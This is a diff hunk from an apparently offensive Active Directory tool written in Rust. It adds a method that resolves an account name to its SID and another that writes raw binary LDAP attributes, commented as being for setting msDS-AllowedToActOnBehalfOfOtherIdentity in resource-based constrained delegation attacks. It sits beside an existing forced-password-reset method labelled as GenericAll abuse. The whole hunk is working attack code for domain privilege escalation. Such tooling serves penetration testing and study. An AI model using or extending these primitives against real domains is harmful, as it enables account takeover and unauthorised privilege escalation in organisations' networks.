@@ -197,6 +197,31 @@ impl Collector {
         Ok(())
     }
 
+    /// Resolve a sAMAccountName to its SID.
+    pub async fn resolve_sid(&mut self, sam: &str) -> Result<Sid> {
+        let base = self.base_dn.clone();
+        let (rs, _) = self
+            .ldap
+            .search(&base, Scope::Subtree, &format!("(sAMAccountName={sam})"), vec!["objectSid"])
+            .await?
+            .success()?;
+        let e = rs.into_iter().next().context("object not found")?;
+        let se = SearchEntry::construct(e);
+        se.bin_attrs
+            .get("objectSid")
+            .and_then(|v| v.first())
+            .and_then(|b| Sid::from_bytes(b))
+            .context("no objectSid")
+    }
+
+    /// Replace a binary attribute (e.g. write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD).
+    pub async fn write_binary(&mut self, dn: &str, attr: &str, value: Vec<u8>) -> Result<()> {
+        use ldap3::Mod;
+        let m: Mod<Vec<u8>> = Mod::Replace(attr.as_bytes().to_vec(), HashSet::from([value]));
+        self.ldap.modify(dn, vec![m]).await?.success().context("binary modify failed")?;
+        Ok(())
+    }
+
     /// Force-set an account password (ForceChangePassword / GenericAll abuse). unicodePwd
     /// is a quoted UTF-16LE string; the DC requires the connection to be encrypted (LDAPS).
     pub async fn set_password(&mut self, dn: &str, password: &str) -> Result<()> {
